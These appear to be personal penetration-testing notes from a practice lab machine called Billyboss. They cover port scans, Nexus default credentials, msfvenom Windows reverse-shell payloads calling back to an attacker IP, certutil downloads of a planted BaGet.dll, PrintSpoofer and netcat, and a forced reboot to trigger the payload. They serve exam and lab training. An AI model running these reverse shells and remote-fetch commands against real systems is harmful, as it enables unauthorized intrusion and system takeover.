### Rust scan
```
docker run -it --rm --name rustscan rustscan/rustscan:1.10.0 $IP
```

PORT      STATE SERVICE         REASON
21/tcp    open  ftp             syn-ack
80/tcp    open  http            syn-ack
135/tcp   open  msrpc           syn-ack
139/tcp   open  netbios-ssn     syn-ack
445/tcp   open  microsoft-ds    syn-ack
5040/tcp  open  unknown         syn-ack
8081/tcp  open  blackice-icecap syn-ack
49664/tcp open  unknown         syn-ack
49665/tcp open  unknown         syn-ack
49666/tcp open  unknown         syn-ack
49667/tcp open  unknown         syn-ack
49668/tcp open  unknown         syn-ack

http://192.168.243.61:8081/

default creds is nexus/nexus. Try the name of website first before bruteforce

### Find windows version
`sudo nmap -sV -sS -A $IP -p21,80,8081 -v`

### Nope so just try windows/shell_reverse_tcp
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.243 LPORT=445 -f exe -o shell.exe`

```
����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\BaGet\BaGet.exe": Authenticated Users [WriteData/CreateFiles]


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.243 LPORT=135 -f exe -o BaGet.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.243 LPORT=135 -f dll -o BaGet.dll

certutil -urlcache -f http://192.168.49.243/BaGet.dll C:\BaGet\BaGet.dll

shutdown -r -t 1 && exit
```

### winPEASany
```
certutil -urlcache -f http://192.168.49.243/winPEASany.exe C:\Users\nathan\winPEASany.exe

not working properly

certutil -urlcache -f http://192.168.49.243/PrintSpoofer64.exe C:\Users\nathan\PrintSpoofer64.exe
certutil -urlcache -f http://192.168.49.243/nc.exe C:\Users\nathan\nc.exe
```

### BaGet.exe is the rabbit hole. LOL...
let's enum something else

### windows-exploit-suggester very old
```
cd /opt

sudo python2 windows-exploit-suggester.py --update

[*] initiating winsploit version 3.3...
[+] writing to file 2022-09-06-mssb.xls
[*] done
```

```
sudo python2 windows-exploit-suggester.py --database 2022-09-06-mssb.xls --systeminfo systeminfo.txt
```
6 years now, no longer working

### wesng is the next generation
```
sudo ./wes.py /home/alvin/Documents/OSCP-PWK/PgPractice/Windows/Billyboss/systeminfo.txt
```

Listing the installed KBs, we learn that the most recently installed patch is KB4540673. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.243 LPORT=8081 -f dll -f csharp
```